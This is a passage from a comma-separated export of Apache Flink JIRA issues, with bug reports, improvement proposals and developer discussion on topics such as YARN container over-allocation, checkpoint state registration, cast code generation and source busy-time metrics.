 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jun 17 10:03:29 UTC 2023,,,,,,,,,,"0|z1i0go:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 11:44;dianfu;[~wash] Good catch! This seems like a critical problem. Would you like to open a PR to fix this issue?;;;","15/Jun/23 13:36;wash;I doubt I'll have the time anytime soon to study the code enough to make such a change.;;;","16/Jun/23 05:25;dianfu;[~wash] I have submitted a PR (https://github.com/apache/flink/pull/22802). Could you help to review? It would be great if you could also help to verify it~;;;","16/Jun/23 18:01;wash;I can confirm it resolves the use-case that was previously failing for me. Thanks for getting that PR up so quickly.;;;","17/Jun/23 10:03;dianfu;Fixed in:
- master via f64563bc1a7ff698acd708b61e9e80ae9c3e848f
- release-1.17 via 1b3f25432a29005370b0f51aaa7d4ee79a5edd58
- release-1.16 via f9394025fb756c844ec5f2615971f227d40b9244;;;",,,,,,,,,,,,,,,,,,
FRocksDB fix log file create failed caused by file name too long,FLINK-32135,13536886,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,Feifan Wang,Feifan Wang,Feifan Wang,19/May/23 15:33,20/May/23 05:37,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / State Backends,,,,0,,,,"RocksDB use instance path as log file name when specifying log path, but if instance path is too long to exceed filesystem's limit, log file creation will fail.

We disable log relocating when RocksDB instance path is too long in FLINK-31743, but that's just a hotfix. This ticket proposal save this problem on FrocksDB.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-19 15:33:46.0,,,,,,,,,,"0|z1i0d4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Autoscaler min/max parallelism configs should respect the current job parallelism,FLINK-32134,13536868,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gyfora,gyfora,gyfora,19/May/23 13:19,22/May/23 13:42,04/Jun/24 20:41,22/May/23 13:41,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Autoscaler,Kubernetes Operator,,,0,pull-request-available,,,The autoscaler should never scale the job purely due to max/min parallelism configs. We should adjust these limits to the current parallelism,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 13:41:57 UTC 2023,,,,,,,,,,"0|z1i094:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 13:41;gyfora;merged to main 505da97b73798f5f8134f56354ef6e205bddb4e9;;;",,,,,,,,,,,,,,,,,,,,,,
Batch requests and remove requests in the end to reduce YarnResourceManager's excess containers,FLINK-32133,13536866,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Jiangang,Jiangang,19/May/23 13:01,24/May/23 07:47,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Deployment / YARN,,,,0,,,,"h1. Problem

When the initial job requests many containers from yarn, it is easy to get more than needed containers for that the YARN AM-RM protocol is not a delta protocol (please see YARN-1902). For example, we are needing 3000 containers. Consider the following case. 

*Case one:*
 # The job requests 2000 containers firstly and then the yarn client has 2000 requests.
 # {color:#FF0000}The yarn heartbeat happens and the yarn client +request 2000 containers+ to yarn rm.{color}
 # The job requests another 1000 containers and the the yarn client has 3000 requests.
 # {color:#FF0000}The yarn heartbeat happens and the yarn client +request 3000 containers+ to yarn rm.{color}
 # On heartbeat finish, yarn rm {+}returns 2000 containers{+}. After the callback the method onContainersAllocated and removeContainerRequest, yarn client has 1000 requests.
 # {color:#FF0000}The yarn heartbeat happens and the yarn client +request 1000 containers+ to yarn rm. {color}
 # On heartbeat finish, yarn rm {+}returns 3000 containers{+}. After the callback the method onContainersAllocated and removeContainerRequest, yarn client has 0 requests.
 # {color:#FF0000}The yarn heartbeat happens.{color}
 # On heartbeat finish, yarn rm +returns 1000 containers+{color:#FF0000} {color:#172b4d}which are excess since the last client request number is 1000.{color}{color}

{color:#172b4d}In the end, the yarn may allocate 2000 + 3000 + 1000 = 6000 containers. But we only need 3000 containers and should return 3000 containers.{color}

*{color:#172b4d}Case two:{color}*
 # {color:#172b4d}The job requests 3000 containers firstly and the the yarn client has 3000 requests.{color}
 # {color:#FF0000}The yarn heartbeat happens and the yarn client +request 3000 containers+ to yarn rm.{color}
 # On heartbeat finish, yarn rm {+}returns 1000 containers({+}2000 allocating{+}){+}. After the callback the method onContainersAllocated and removeContainerRequest, yarn client has 2000 requests.
 # {color:#FF0000}The yarn heartbeat happens and the yarn client +request 2000 containers+ to yarn rm.{color}
 # On heartbeat finish, yarn rm {+}returns 2000 containers{+}. After the callback the method onContainersAllocated and removeContainerRequest, yarn client has 0 requests.
 # {color:#FF0000}The yarn heartbeat happens.{color}
 # On heartbeat finish, yarn rm +returns 2000 containers+{color:#FF0000} {color:#172b4d}which are excess since the last client request number is 2000.{color}{color}

{color:#172b4d}In the end, the yarn may allocate 1000 + 2000 + 2000 = 5000 containers. But we only need 3000 containers and should return 2000 containers.{color}

{color:#172b4d}The reason is that any update to the yarn client's requests may produce undesired behavior. {color}
h1. {color:#172b4d}Solution{color}

{color:#172b4d}In our inner flink version, we use two ways to resolve the problem as following:{color}
 # {color:#172b4d}{color:#172b4d}Compute the total resource requests at start and request by batch{color}{color}{color:#172b4d} to avoid being interrupted by yarn heartbeat. Note that we {color}{color:#172b4d}{color:#172b4d}loop {color}{color}resourceManagerClient.addContainerRequest(containerRequest){color:#172b4d}) to simulate batch-request quickly.{color}
 # {color:#172b4d}Remove the yarn client's container requests after receiving enough resources to avoid request update.{color}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 24 07:47:29 UTC 2023,,,,,,,,,,"0|z1i08o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/May/23 13:04;Jiangang;A related issue is https://issues.apache.org/jira/browse/FLINK-10848.;;;","22/May/23 03:49;huwh;As you said, this problem is caused by the YARN AM-RM protocol. IMHO the current mechanism of Flink can already ensure that there are no more containers are started at the end. 

I don't understand what this issue is trying to solve. Are you trying to ensure that each Container Request is sent to RM only once? This is not easy to implement; we need to remove requests once they are explicitly received by RM, but there is no guarantees that the heartbeat was accepted.

 

For solution, I have few questions. 
{quote}1. Compute the total resource requests at start and request by batch to avoid being interrupted by yarn heartbeat
{quote}
The ActiveResourceManager will requests new containers when needed. We could not known how many resources needed when ResourceManager started. For example, Batch jobs are deployed in phases.

 
{quote}{color:#172b4d}loop {color}resourceManagerClient.addContainerRequest(containerRequest)) to simulate batch-request quickly.
{quote}
IIUC, AM-RM heartbeat running in AM-RM thread. Flink yarnResourceManagerDriver running in Flink main thread. AmRmClient solves the concurrent competition problem by add ""

synchronized"" to ""resourceManagerClient.addContainerRequest"". But there still a chance that AM-RM client sent part requests if we call addContainerRequest multi times.

 
{quote}{color:#172b4d}Remove the yarn client's container requests after receiving enough resources to avoid request update.{color}
{quote}
I think [yarnResourceManagerDriver|https://github.com/apache/flink/blob/master/flink-yarn/src/main/java/org/apache/flink/yarn/YarnResourceManagerDriver.java#L468] already did this.

 

Correct me if I'm wrong.;;;","22/May/23 08:59;Jiangang;[~huwh] Thanks for the detail analysis. Although the problem is caused by yarn, we should try to reduce the effect by all means. In our situation, the excess containers may cause serious resource balance problem. For example, we need 3000 containers but received 5000 containers. The 5000 containers are balanced among the cluster.  After returning 2000 containers which may located at certain hosts, these hosts may be free while others are busy.

The solution are try-best but not perfect:
 #  For the batch requests, we can compute the required resources at start for streaming mode(this is our situation). For the batch mode, I think we can change the incremental request to batch request when scheduling each phase. After loop calling resourceManagerClient.addContainerRequest, call resourceManagerClient.setHeartbeatInterval(containerRequestHeartbeatIntervalMillis). This may alleviate the problem greatly especially when there are a lots of requests.
 # For removing the container requests, flink removes the requests gradually every time some containers are allocated in method onContainersAllocated. This process may repeat multi times which may cause excess container allocated. We can remove container requests only when all the resources are satisfied to avoid the problem.

This issue aims to try best to alleviate the problem. After the modification in our company, we can hardly see the excess problem.;;;","24/May/23 07:47;huwh;{quote}We can remove container requests only when all the resources are satisfied to avoid the problem.
{quote}
Currently, we ensure that Flink internal count is strongly consistent with the RM Client to identify excess containers, [code|https://github.com/apache/flink/blob/master/flink-yarn/src/main/java/org/apache/flink/yarn/YarnResourceManagerDriver.java#L505] . This change will lead to some consistency issues, such as applying 1000 containers, 500 being allocated in the first heartbeat, and then cancelling all requests. What should we do at this time? 
Thinking about how to deal with these states adds a lot of complexity, but just as you said, it doesn't completely solve the problem, it just alleviates it.

Did you try increase the value of  ""yarn.heartbeat.container-request-interval""? This will reduce the heartbeat between AM and RM. This can also reduce excess. ;;;",,,,,,,,,,,,,,,,,,,
Cast function CODEGEN does not work as expected when nullOnFailure enabled,FLINK-32132,13536854,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zhoujira86,zhoujira86,zhoujira86,19/May/23 10:25,28/Jul/23 02:15,04/Jun/24 20:41,03/Jul/23 13:47,1.16.1,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"I am trying to generate code cast string to bigint, and got generated code like:

 

 
{code:java}
// code placeholder

if (!isNull$14) {
result$15 = org.apache.flink.table.data.binary.BinaryStringDataUtil.toLong(field$13.trim());
} else {
result$15 = -1L;
}

   castRuleResult$16 = result$15;
   castRuleResultIsNull$17 = isNull$14;
 } catch (java.lang.Throwable e) {
   castRuleResult$16 = -1L;
   castRuleResultIsNull$17 = true;
 }
 // --- End cast section

out.setLong(0, castRuleResult$16); {code}
such kind of handle does not provide a perfect solution as the default value of long is set to -1L, which can be meaningful in some case. And can cause some calculation error.
 
And I understand the cast returns a bigint not null, But since there is a exception, we should ignore the type restriction, so I suggest to modify the CodeGenUtils.rowSetField like below:
 
{code:java}
// code placeholder

if (fieldType.isNullable || fieldExpr.nullTerm.startsWith(""castRuleResultIsNull"")) {
  s""""""
     |${fieldExpr.code}
     |if (${fieldExpr.nullTerm}) {
     |  $setNullField;
     |} else {
     |  $writeField;
     |}
    """""".stripMargin
} else {
  s""""""
     |${fieldExpr.code}
     |$writeField;
   """""".stripMargin
} {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 03 13:47:07 UTC 2023,,,,,,,,,,"0|z1i060:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 02:42;luoyuxia;[~zhoujira86] Thanks for reporting. Would you like to take it?;;;","22/May/23 06:00;zhoujira86;[~luoyuxia] yes, please assign to me;;;","26/May/23 01:58;zhoujira86;[~luoyuxia] Can you please help review;;;","03/Jul/23 13:47;Sergey Nuyanzin;Merged to master as [1824c251d07e720d0e5f30531ce5114979934ebf|https://github.com/apache/flink/commit/1824c251d07e720d0e5f30531ce5114979934ebf];;;",,,,,,,,,,,,,,,,,,,
Support specifying hadoop config dir for Python HiveCatalog,FLINK-32131,13536817,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,dianfu,dianfu,dianfu,19/May/23 05:47,22/May/23 01:43,04/Jun/24 20:41,22/May/23 01:43,,,,,,,,,,,,,,,1.18.0,,,,,,API / Python,,,,0,pull-request-available,,,"Hadoop config directory could be specified for HiveCatalog in Java, however, this is still not supported in Python HiveCatalog. This JIRA is to align them.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 01:43:53 UTC 2023,,,,,,,,,,"0|z1hzy0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 01:43;dianfu;Merged to master via 5a89d22c146f451f12fd0c6de64804d315e1f4b6;;;",,,,,,,,,,,,,,,,,,,,,,
previous checkpoint will be broke by the subsequent incremental checkpoint,FLINK-32130,13536801,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,Feifan Wang,Feifan Wang,19/May/23 02:42,07/Aug/23 11:48,04/Jun/24 20:41,23/May/23 06:48,,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,,,,0,pull-request-available,,,"Currently, _SharedStateRegistryImpl_ will discard old one while register new state to same key:
{code:java}
// Old entry is not in a confirmed checkpoint yet, and the new one differs.
// This might result from (omitted KG range here for simplicity):
// 1. Flink recovers from a failure using a checkpoint 1
// 2. State Backend is initialized to UID xyz and a set of SST: { 01.sst }
// 3. JM triggers checkpoint 2
// 4. TM sends handle: ""xyz-002.sst""; JM registers it under ""xyz-002.sst""
// 5. TM crashes; everything is repeated from (2)
// 6. TM recovers from CP 1 again: backend UID ""xyz"", SST { 01.sst }
// 7. JM triggers checkpoint 3
// 8. TM sends NEW state ""xyz-002.sst""
// 9. JM discards it as duplicate
// 10. checkpoint completes, but a wrong SST file is used
// So we use a new entry and discard the old one:
LOG.info(
        ""Duplicated registration under key {} of a new state: {}. ""
                + ""This might happen during the task failover if state backend creates different states with the same key before and after the failure. ""
                + ""Discarding the OLD state and keeping the NEW one which is included into a completed checkpoint"",
        registrationKey,
        newHandle);
scheduledStateDeletion = entry.stateHandle;
entry.stateHandle = newHandle; {code}
But if _execution.checkpointing.max-concurrent-checkpoints_ > 1, the following case will fail (take _RocksDBStateBackend_ as an example):
 # cp1 trigger: 1.sst be uploaded to file-1, and register <1.sst,file-1>, cp1 reference file-1
 # cp1 is not yet complete， cp2 trigger: 1.sst be uploaded to file-2, and try register <1.sst,file-2>. SharedStateRegistry discard file-1
 # cp1 completed and cp2 failed, but the cp1 is broken (file-1 has be deleted)

I add a test to reproduce the problem ( [pr-22606|https://github.com/apache/flink/pull/22606] ).

I think we should allow register multi state object to same key, WDYT [~pnowojski], [~roman]  ？",,,,,,,,,,,,,,,,,,,,FLINK-29913,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 23 08:22:45 UTC 2023,,,,,,,,,,"0|z1hzug:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 10:23;roman;Thanks for reporting the issue and providing the test case [~Feifan Wang].

Is it the same as FLINK-29913? If so, I propose to close this ticket as duplicate and continue discussion in FLINK-29913.

Nevertheless, the analysis seems correct to me.;;;","23/May/23 06:46;Feifan Wang;Sorry [~roman] , I didn't notice FLINK-29913 earlier, this ticket is indeed the same issue as FLINK-29913. I will close this ticket and move discussion to FLINK-29913.;;;","23/May/23 06:48;Feifan Wang;duplicate to FLINK-29913;;;","23/May/23 08:22;roman;Thanks [~Feifan Wang] ;;;",,,,,,,,,,,,,,,,,,,
Filesystem connector is not compatible with option 'pipeline.generic-types',FLINK-32129,13536800,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,19/May/23 02:27,22/May/23 11:47,04/Jun/24 20:41,22/May/23 11:45,1.17.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / FileSystem,,,,0,pull-request-available,,,"Filesystem connector always output 'PartitionCommitInfo' message even when there is no partition in the sink table, which will cause exception `java.lang.UnsupportedOperationException: Generic types have been disabled in the ExecutionConfig and type java.util.List is treated as a generic type.` when `pipeline.generic-types` is false",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 11:45:10 UTC 2023,,,,,,,,,,"0|z1hzu8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 11:45;libenchao;Fixed via [https://github.com/apache/flink/commit/3cbacbf26f09b5301b280beed4f78fc03d573d76]

[~zjureel] Thanks for the PR!;;;",,,,,,,,,,,,,,,,,,,,,,
Unmodifiable implementation for getter method in test function,FLINK-32128,13536692,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,seungchullee,seungchullee,18/May/23 07:32,18/May/23 10:45,04/Jun/24 20:41,,1.17.0,,,,,,,,,,,,,,,,,,,,Tests,,,,0,test-stability,,,"While using the Flink in our company, I would like to share a small suggestion in the test code. I understand that it may be a minor issue, but I would like to raise it and share my thoughts as one of the Flink's user.

 

As you already know, ArrayList is a mutable container class.

To prevent callers from being able to mutable its internal data, the current code copies the entires data into new ArrayList as below.
{code:java}
public class TestingReaderContext implements SourceReaderContext {

    private final SourceReaderMetricGroup metrics;

    private final Configuration config;

    private final ArrayList<SourceEvent> sentEvents = new ArrayList<>();

    ....

    public List<SourceEvent> getSentEvents() {
          return new ArrayList<>(sentEvents);
    }

    ....
} {code}
 

I would like to suggest that alternatively, if possible, it is better to return some other implementation that the class can use to enforce its invariants.

For example, rather than copying its entire dataset in the current test code, I would like to use an unmodifiable implementation as shown in below.
{code:java}
public class TestingReaderContext implements SourceReaderContext {

    private final SourceReaderMetricGroup metrics;

    private final Configuration config; 

    private final ArrayList<SourceEvent> sentEvents = new ArrayList<>();

    ....

    public List<SourceEvent> getSentEvents() {
         return Collections.unmodifiableList(sentEvents);
    }

    ....
} {code}
 

 

Since the callers that uses the sentEvents list are only used for reading its internal data in the test code, it would be better to use an unmodifiable implementation. 

The entire code can be found in the TestingReaderContext class.

While it may be a small suggestion, I raised the issue with the intention of making the current test code more robust. 

 

Thanks.",,7200,7200,,0%,7200,7200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-18 07:32:01.0,,,,,,,,,,"0|z1hz68:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Source busy time is inaccurate in many cases,FLINK-32127,13536682,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mxm,Zhanghao Chen,Zhanghao Chen,18/May/23 06:16,15/Nov/23 12:39,04/Jun/24 20:41,15/Nov/23 12:39,,,,,,,,,,,,,,,kubernetes-operator-1.7.0,,,,,,Autoscaler,,,,0,,,,"We found that source busy time is inaccurate in many cases. The reason is that sources are usu. multi-threaded (Kafka and RocketMq for example), there is a fetcher thread fetching data from data source, and a consumer thread deserializes data with an blocking queue in between. A source is considered 
 # *idle* if the consumer is blocked by fetching data from the queue
 # *backpressured* if the consumer is blocked by writing data to downstream operators
 # *busy* otherwise

However, this means that if the bottleneck is on the fetcher side, the consumer will be often blocked by fetching data from the queue, the source idle time would be high, but in fact it is busy and consumes a lot of CPU. In some of our jobs, the source max busy time is only ~600 ms while it has actually reached the limit.

The bottleneck could be on the fetcher side, for example, when Kafka enables zstd compression, uncompression on the consumer side could be quite heavy compared to data deserialization on the consumer thread side.",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-33306,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Nov 15 12:39:27 UTC 2023,,,,,,,,,,"0|z1hz40:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"18/May/23 06:26;gyfora;cc [~mxm] ;;;","19/May/23 02:49;Wencong Liu;Hi [~Zhanghao Chen] , Thanks for the proposal! I guess the key point of the issue is that some operations consuming CPU (compress/uncompress) should be regarded as a part of data processing in task executor. Only in this way, the busy percent of source task will be accurate. Therefore, I think another key point is that how to unify the busy percent computation logic for both source task and non-source task. 🤔;;;","19/May/23 05:31;Zhanghao Chen;Hi [~Wencong Liu]. I think the key problem here is that busy time is well-defined for single-threaded computation, but ill-defined for multi-threaded computation. As is pointed out in this [blog|[https://flink.apache.org/2021/07/07/how-to-identify-the-source-of-backpressure/#what-are-those-numbers]], {{busyTimeMsPerSecond}} and {{idleTimeMsPerSecond}} metrics are oblivious to anything that is happening in separate threads, outside of the main subtask’s execution loop. I'm not sure if there exist a way to somewhat solve it for sources, but maybe we'd better document it [here|https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/ops/monitoring/back_pressure/#task-performance-metrics] first.;;;","22/May/23 17:00;mxm;Thanks for raising the issue. I agree that the multi-threaded source busy time is not well-defined and differs considerably from the non-source operators. The busy time is a very critical factor for the scaling algorithm because it factors out backpressure from the processing rate. It looks like we have to address (1) and make the source busy, unless it is backpressured or actually idle.;;;","31/Oct/23 10:18;mxm;A new scaling method has been merged to address the unreliable source busyness metric: FLINK-33306.;;;","15/Nov/23 12:39;gyfora;Fixed by the improved true processing rate tracking;;;",,,,,,,,,,,,,,,,,
When program arg contains two single quotes org.apache.flink.configuration.StructuredOptionsSplitter.consumeInQuotes fails,FLINK-32126,13536680,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,elkhand,elkhand,18/May/23 06:08,22/May/23 13:54,04/Jun/24 20:41,,1.17.0,,,,,,,,,,,,,,,,,,,,Runtime / Configuration,,,,0,,,,"When the program argument contains two single quotes, then it fails :

```

for key '$internal.application.program-args'.\n\tat org.apache.flink.configuration.Configuration.getOptional(Configuration.java:720)\n\tat org.apache.flink.configuration.Configuration.get(Configuration.java:704)\n\tat org.apache.flink.configuration.ConfigUtils.decodeListFromConfig(ConfigUtils.java:126)\n\tat org.apache.flink.client.deployment.application.ApplicationConfiguration.fromConfiguration(ApplicationConfiguration.java:80)\n\tat org.apache.flink.kubernetes.entrypoint.KubernetesApplicationClusterEntrypoint.getPackagedProgram(KubernetesApplicationClusterEntrypoint.java:93)\n\tat org.apache.flink.kubernetes.entrypoint.KubernetesApplicationClusterEntrypoint.main(KubernetesApplicationClusterEntrypoint.java:70)\n

Caused by: java.lang.IllegalArgumentException: Could not split string. Quoting was not closed properly.\n\tat org.apache.flink.configuration.StructuredOptionsSplitter.consumeInQuotes(StructuredOptionsSplitter.java:163)\n\tat org.apache.flink.configuration.StructuredOptionsSplitter.tokenize(StructuredOptionsSplitter.java:129)\n\tat org.apache.flink.configuration.StructuredOptionsSplitter.splitEscaped(StructuredOptionsSplitter.java:52)\n\tat org.apache.flink.configuration.ConfigurationUtils.convertToList(ConfigurationUtils.java:347)\n\tat org.apache.flink.configuration.Configuration.lambda$getOptional$2(Configuration.java:714)\n\tat java.base/java.util.Optional.map(Optional.java:265)\n\tat org.apache.flink.configuration.Configuration.getOptional(Configuration.java:714)

```

Double single quotes are used in faker connector extensively, and if FlinkSQL script is passed as main argument, then it fails with the above exception. This is just to show the use case of two single quotes usage in practice.

```

CREATE TEMPORARY TABLE IF NOT EXISTS xyz_table (
 env STRING,
 dt DATE
)
WITH (
'connector' = 'faker' ,
'rows-per-second' = '20' ,
'fields.env.expression' = '#\{Options.option ''VAL'',''LIVE'')}' ,
'fields.dt.expression' = '#\{date.past ''48'',''HOURS''}',
'source.parallelism' = '3'
);

```",Flink 1.17,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,Java,2023-05-18 06:08:57.0,,,,,,,,,,"0|z1hz3k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support Unified job submission API,FLINK-32125,13536679,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,melin,melin,18/May/23 06:08,18/May/23 06:08,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"Based on the flink secondary development platform, different deployment modes and yarn and kubernetes modes differ greatly, and there is no unified API.

SparkLauncher is recommended。https://github.com/apache/spark/blob/master/launcher/src/main/java/org/apache/spark/launcher/SparkLauncher.java",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-18 06:08:10.0,,,,,,,,,,"0|z1hz3c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add option to enable partition alignment for sources,FLINK-32124,13536678,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,Zhanghao Chen,Zhanghao Chen,18/May/23 06:06,19/May/23 05:34,04/Jun/24 20:41,19/May/23 05:34,,,,,,,,,,,,,,,,,,,,,Autoscaler,,,,0,,,,"Currently, autoscaler did not consider balancing partitions among source tasks. In our production env, partition skew has proven to be a severe problem for many jobs. Especially in a job topology with all forward or rescale shuffles,  partition skew on the source side can further lead to data imbalance in later operators.

We should add an option to enable partition alignment for sources for that, but making it disabled by default as this has a side effect in that partition usu. has limited factors and enabling alignment will greatly limit our scaling choices. Also, if data among partitions are imbalanced in the first place, partition alignment won't help as well (this is not a common case inside our company though).",,,,,,,,,,,,,,,,,,FLINK-32119,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 19 05:33:17 UTC 2023,,,,,,,,,,"0|z1hz34:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"18/May/23 06:25;gyfora;This is related to https://issues.apache.org/jira/browse/FLINK-32124

But I think currently we actually consider partition balance. We set the max parallelism to the number of partitions and only select parallelisms that are divisors of this (so there is always balance);;;","18/May/23 06:33;Zhanghao Chen;Thanks [~gyfora]. I'll follow up there.;;;","18/May/23 07:30;zjureel;[~gyfora]Is the link https://issues.apache.org/jira/browse/FLINK-32124 wrong? It's just the link of the current issue;;;","18/May/23 07:34;gyfora;My bad, this is what I meant: https://issues.apache.org/jira/browse/FLINK-32119

 ;;;","18/May/23 07:35;gyfora;[~Zhanghao Chen] can you please confirm that the current behaviour is actually always partition alignment? How could we align it even better?;;;","19/May/23 05:33;Zhanghao Chen;Hi [~gyfora]. I confirmed that operator actually aligns it, an internal code change in our production breaks it. Sorry for the confusion and I'll close this ticket.;;;",,,,,,,,,,,,,,,,,
Avro Confluent Schema Registry nightly end-to-end test failed due to timeout,FLINK-32123,13536612,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,pgaref,pgaref,pgaref,17/May/23 19:25,20/May/23 17:38,04/Jun/24 20:41,20/May/23 17:37,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / Kafka,,,,0,pull-request-available,test-stability,,"For the past few hours, E2E tests fail with: 'Avro Confluent Schema Registry nightly end-to-end test' failed after 9 minutes and 53 seconds! Test exited with exit code 1

Looks like [https://archive.apache.org/dist/kafka/]  mirror is overloaded – download locally took more than 30min

Lets switch to  [https://downloads.apache.org|https://downloads.apache.org/] mirror
